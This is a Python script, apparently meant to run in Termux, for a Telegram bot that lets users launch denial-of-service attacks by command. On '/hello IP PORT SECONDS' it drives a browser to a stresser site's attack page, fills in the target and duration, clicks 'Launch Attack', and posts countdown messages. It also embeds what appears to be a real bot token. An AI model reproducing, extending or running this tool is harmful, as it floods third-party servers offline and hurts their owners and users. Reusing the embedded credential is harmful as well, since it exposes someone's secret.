# Save as: bot_android.py
# Run in Termux: python bot_android.py

import asyncio
from playwright.async_api import async_playwright
from telebot.async_telebot import AsyncTeleBot
import time
import random
import string

# ────────────────────────────────────────────────
# CONFIG
# ────────────────────────────────────────────────
BOT_TOKEN = "8421640384:AAEwhC-l296tD_SKwSIclceEEtge3sb4qhc"
WEBSITE_URL = "https://satellitestress.st/attack"

bot = AsyncTeleBot(BOT_TOKEN)

# Global lock (simple in-memory for one attack at a time)
current_attack_end = 0

async def is_attack_running():
    global current_attack_end
    if current_attack_end > time.time():
        return True, int(current_attack_end - time.time())
    current_attack_end = 0
    return False, 0

async def start_attack_lock(duration):
    global current_attack_end
    current_attack_end = time.time() + duration

def generate_key(length=10):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))

# ────────────────────────────────────────────────
# ATTACK FUNCTION (using Playwright)
# ────────────────────────────────────────────────
async def perform_attack(message, ip, port, duration, cmd_type="hello"):
    chat_id = message.chat.id
    msg = await bot.send_message(chat_id, f"🔥 *{cmd_type.upper()} ATTACK STARTING...* 🔥\nTarget: `{ip}:{port}`\nDuration: *{duration}s*", parse_mode='Markdown')

    running, rem = await is_attack_running()
    if running:
        await bot.edit_message_text(f"⏳ Another attack running — wait *{rem}s*", chat_id, msg.message_id, parse_mode='Markdown')
        return

    try:
        async with async_playwright() as p:
            # Launch real Chromium (headless=False so you can see it)
            browser = await p.chromium.launch(headless=False, args=['--no-sandbox', '--disable-gpu'])
            page = await browser.new_page()

            await page.goto(WEBSITE_URL, wait_until="networkidle", timeout=60000)

            # Wait for form fields
            await page.wait_for_selector("input[placeholder='104.29.138.132']", timeout=30000)

            await page.fill("input[placeholder='104.29.138.132']", ip)
            await page.fill("input[placeholder='80']", port)
            await page.fill("input[placeholder='60']", str(duration))

            await page.click("button:has-text('Launch Attack')")

            await start_attack_lock(duration)

            # Countdown
            for i in range(duration, 0, -10):
                await asyncio.sleep(10)
                try:
                    await bot.edit_message_text(
                        f"🔥 Attack running ({cmd_type})\nTarget: `{ip}:{port}`\n⏳ *{i}s remaining...*",
                        chat_id, msg.message_id, parse_mode='Markdown'
                    )
                except:
                    pass

            await bot.edit_message_text(
                f"✅ *Attack finished!*\nTarget: `{ip}:{port}` ({duration}s)",
                chat_id, msg.message_id, parse_mode='Markdown'
            )
            await asyncio.sleep(5)
            await bot.delete_message(chat_id, msg.message_id)
            await bot.delete_message(chat_id, message.message_id)

            await browser.close()

    except Exception as e:
        await bot.edit_message_text(f"❌ *Error:* {str(e)}", chat_id, msg.message_id, parse_mode='Markdown')

# ────────────────────────────────────────────────
# COMMANDS (basic example - add more as needed)
# ────────────────────────────────────────────────

@bot.message_handler(commands=['start'])
async def cmd_start(message):
    text = (
        "🌟 *Welcome to Android Stress Bot* 🌟\n\n"
        "⚡ Run attacks directly from your phone!\n"
        "Usage: `/hello IP PORT SECONDS`\n\n"
        "🔥 Type /help for more"
    )
    await bot.reply_to(message, text, parse_mode='Markdown')

@bot.message_handler(commands=['hello'])
async def cmd_hello(message):
    args = message.text.split()
    if len(args) != 4:
        await bot.reply_to(message, "Usage: `/hello IP PORT SECONDS`\nExample: `/hello 1.2.3.4 80 60`", parse_mode='Markdown')
        return

    _, ip, port, dur_str = args
    try:
        duration = int(dur_str)
    except:
        await bot.reply_to(message, "Seconds must be a number!")
        return

    await perform_attack(message, ip, port, duration, "hello")

# Add other commands like /help, /price etc. here...

print("Android bot started (Playwright + Termux mode)")
asyncio.run(bot.infinity_polling())